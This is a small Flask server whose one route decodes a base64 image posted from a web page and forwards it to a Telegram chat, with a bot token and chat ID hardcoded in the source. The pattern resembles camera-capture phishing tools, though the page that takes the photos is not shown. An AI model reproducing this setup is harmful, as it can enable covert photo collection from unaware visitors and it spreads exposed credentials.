from flask import Flask, render_template, request, jsonify
import os
import base64
import requests
from io import BytesIO

app = Flask(__name__)

# Telegram credentials
TELEGRAM_BOT_TOKEN = '8016918984:AAFMgCqS9eiSpxVB1305XLjxwYvoDfyBR_I'
TELEGRAM_CHAT_ID = '1212987497'

def send_photo_to_telegram_bytes(img_bytes):
    """Send image directly to Telegram from memory."""
    bio = BytesIO(img_bytes)
    bio.name = 'photo.jpg'
    files = {'photo': bio}
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    data = {'chat_id': TELEGRAM_CHAT_ID}
    r = requests.post(url, files=files, data=data)
    print(f"[Telegram] Status: {r.status_code}")
    print(f"[Telegram] Response: {r.text}")
    return r.status_code, r.text

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    try:
        data = request.json
        img_data = data['image'].split(",")[1]  # Remove base64 header
        img_bytes = base64.b64decode(img_data)

        # Send image directly from memory
        status, resp = send_photo_to_telegram_bytes(img_bytes)

        if status == 200:
            return jsonify({"message": "Photo sent to Telegram"}), 200
        else:
            return jsonify({"message": "Failed to send to Telegram", "response": resp}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
